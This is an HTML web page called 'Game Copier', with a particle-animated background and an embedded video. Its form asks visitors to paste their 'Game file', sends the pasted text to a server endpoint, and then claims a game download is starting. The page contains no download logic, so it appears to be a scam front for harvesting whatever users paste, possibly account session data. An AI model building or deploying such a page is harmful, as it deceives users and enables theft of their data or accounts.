<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Game Copier</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');

* { box-sizing: border-box; margin: 0; padding: 0; }

body, html {
  font-family: 'Roboto', sans-serif;
  height: 100%;
  overflow: hidden;
  background: #e0e0e0;
  display: flex;
  justify-content: center;
  align-items: center;
  flex-direction: column;
}

canvas {
  position: absolute;
  top: 0;
  left: 0;
  z-index: 0;
}

h1 {
  z-index: 1;
  color: #555;
  font-size: 32px;
  font-weight: 700;
  margin-bottom: 30px;
  text-align: center;
}

.main-wrapper {
  position: relative;
  z-index: 1;
  display: flex;
  gap: 40px;
  align-items: flex-start;
}

.container {
  background: rgba(255, 255, 255, 0.95);
  padding: 20px 25px;
  border-radius: 15px;
  width: 400px;
  height: auto;
  box-shadow: 0 4px 20px rgba(0,0,0,0.25);
  border: 4px solid #fff;
  display: flex;
  flex-direction: column;
  justify-content: flex-start;
  align-items: center;
}

.container p.instructions {
  font-size: 14px;
  color: #555;
  text-align: center;
  margin-bottom: 10px;
}

.container textarea {
  width: 85%;
  height: 80px;
  margin-bottom: 15px;
  padding: 8px;
  border-radius: 8px;
  border: 1px solid #ccc;
  outline: none;
  resize: none;
  font-size: 13px;
  background: #f7f7f7;
  color: #333;
  font-family: monospace;
}

.container button {
  padding: 8px 20px;
  border: none;
  border-radius: 8px;
  font-size: 15px;
  font-weight: bold;
  cursor: pointer;
  background: #bbb;
  color: #333;
  transition: all 0.3s ease;
}

.container button:hover {
  background: #999;
  transform: scale(1.05);
}

#status {
  margin-top: 8px;
  font-size: 13px;
  color: #555;
  word-wrap: break-word;
  min-height: 20px;
}

.video-wrapper iframe {
  border-radius: 15px;
  width: 560px;
  height: 315px;
  max-width: 100%;
  border: 4px solid #fff;
  box-shadow: 0 4px 20px rgba(0,0,0,0.25);
  background: #000;
}
</style>
</head>
<body>

<canvas id="bg"></canvas>

<h1>Game Copier</h1> <!-- Nagłówek nad obiema sekcjami -->

<div class="main-wrapper">
  <div class="container">
    <p class="instructions">
      Paste your Game file in the box below, then click "Start Process".<br>
    </p>
    <textarea id="text" placeholder="Paste your text here..."></textarea>
    <button onclick="release()">Start process</button>
    <p id="status"></p>
  </div>

  <div class="video-wrapper">
    <iframe src="https://www.youtube.com/embed/k9SfgtkEmpo" title="YouTube video" frameborder="0" allowfullscreen></iframe>
  </div>
</div>

<script>
// ===== Canvas Background =====
const canvas = document.getElementById('bg');
const ctx = canvas.getContext('2d');
let w = canvas.width = window.innerWidth;
let h = canvas.height = window.innerHeight;

window.addEventListener('resize', () => {
  w = canvas.width = window.innerWidth;
  h = canvas.height = window.innerHeight;
});

const particles = [];
const numParticles = 150;

for(let i=0; i<numParticles; i++){
  particles.push({
    x: Math.random() * w,
    y: Math.random() * h,
    vx: (Math.random() - 0.5) * 0.4,
    vy: (Math.random() - 0.5) * 0.4,
    radius: 1 + Math.random() * 2
  });
}

function draw(){
  ctx.clearRect(0,0,w,h);
  
  for(let i=0;i<numParticles;i++){
    const p = particles[i];
    ctx.beginPath();
    ctx.arc(p.x,p.y,p.radius,0,Math.PI*2);
    ctx.fillStyle = 'rgba(100,100,100,0.7)';
    ctx.fill();
  }
  
  for(let i=0;i<numParticles;i++){
    for(let j=i+1;j<numParticles;j++){
      const p1 = particles[i];
      const p2 = particles[j];
      const dist = Math.hypot(p1.x - p2.x, p1.y - p2.y);
      if(dist < 100){
        ctx.strokeStyle = 'rgba(150,150,150,' + (1 - dist/100) + ')';
        ctx.lineWidth = 1;
        ctx.beginPath();
        ctx.moveTo(p1.x,p1.y);
        ctx.lineTo(p2.x,p2.y);
        ctx.stroke();
      }
    }
  }
  
  for(let i=0;i<numParticles;i++){
    const p = particles[i];
    p.x += p.vx;
    p.y += p.vy;
    if(p.x < 0 || p.x > w) p.vx *= -1;
    if(p.y < 0 || p.y > h) p.vy *= -1;
  }
  
  requestAnimationFrame(draw);
}

draw();

async function release() {
  const text = document.getElementById("text").value.trim();
  const statusEl = document.getElementById("status");

  if(!text){
    statusEl.innerText = "Please enter some text!";
    return;
  }

  statusEl.innerText = "Processing...";

  try {
    const res = await fetch("/api/release", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text })
    });

    if(res.ok){
      statusEl.innerText = "Game Download Starting... (5 minutes)";
    } else {
      const data = await res.json();
      statusEl.innerText = "Error: " + (data.message || "Something went wrong");
    }
  } catch(err) {
    statusEl.innerText = "Error: " + err.message;
  }
}
</script>

</body>
</html>
